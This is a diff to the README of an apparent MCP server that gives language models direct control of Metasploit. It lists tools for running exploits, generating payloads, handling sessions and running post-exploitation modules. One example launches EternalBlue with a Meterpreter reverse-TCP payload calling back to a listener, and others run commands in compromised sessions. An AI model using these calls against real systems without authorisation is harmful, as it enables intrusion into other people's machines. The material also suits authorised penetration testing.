@@ -8,36 +8,32 @@ This MCP server provides a bridge between large language models like Claude and 
 
 ## Features
 
-### Payload Generation and Execution
+### Module Information
 
-- **generate_payload**: Generate payload files using Metasploit RPC (saves files locally)
-- **execute_local_program**: Execute a locally saved program (e.g., generated payloads)
+- **list_exploits**: Search and list available Metasploit exploit modules
+- **list_payloads**: Search and list available Metasploit payload modules with optional platform and architecture filtering
 
 ### Exploitation Workflow
 
-- **list_exploits**: Search and list available Metasploit exploit modules
-- **list_payloads**: Search and list available Metasploit payload modules
-- **run_exploit**: Configure and execute an exploit against a target
-- **list_active_sessions**: Show current Metasploit sessions
-- **send_session_command**: Run a command in an active session
+- **run_exploit**: Configure and execute an exploit against a target with options to run checks first
+- **run_auxiliary_module**: Run any Metasploit auxiliary module with custom options
+- **run_post_module**: Execute post-exploitation modules against existing sessions
 
-### Post-Exploitation Tools
+### Payload Generation
 
-- **get_system_info**: Retrieve system information from a Meterpreter session
-- **get_user_id**: Get the current user context of a session
-- **list_processes**: List running processes on the target system
-- **migrate_process**: Move a Meterpreter session to another process
-- **filesystem_list**: List files in a directory on the target system
+- **generate_payload**: Generate payload files using Metasploit RPC (saves files locally)
 
-### Listener Management
+### Session Management
+
+- **list_active_sessions**: Show current Metasploit sessions with detailed information
+- **send_session_command**: Run a command in an active shell or Meterpreter session
+- **terminate_session**: Forcefully end an active session
+
+### Handler Management
 
 - **list_listeners**: Show all active handlers and background jobs
 - **start_listener**: Create a new multi/handler to receive connections
 - **stop_job**: Terminate any running job or handler
-
-### Auxiliary Module Support
-
-- **run_auxiliary_module**: Run any Metasploit auxiliary module with options
 
 ## Prerequisites
 
@@ -105,16 +101,15 @@ This tool provides direct access to Metasploit Framework capabilities, which inc
 ### Basic Exploitation
 
 1. List available exploits: `list_exploits("ms17_010")`
-2. Select and run an exploit: `run_exploit("exploit/windows/smb/ms17_010_eternalblue", "192.168.1.100", 445)`
+2. Select and run an exploit: `run_exploit("exploit/windows/smb/ms17_010_eternalblue", {"RHOSTS": "192.168.1.100"}, "windows/x64/meterpreter/reverse_tcp", {"LHOST": "192.168.1.10", "LPORT": 4444})`
 3. List sessions: `list_active_sessions()`
 4. Run commands: `send_session_command(1, "whoami")`
 
 ### Post-Exploitation
 
-1. Get system information: `get_system_info(1)`
-2. List running processes: `list_processes(1)`
-3. Migrate to a more stable process: `migrate_process(1, 1234)`
-4. Browse the filesystem: `filesystem_list(1, "C:\\Users")`
+1. Run a post module: `run_post_module("windows/gather/enum_logged_on_users", 1)`
+2. Send custom commands: `send_session_command(1, "sysinfo")`
+3. Terminate when done: `terminate_session(1)`
 
 ### Handler Management
 
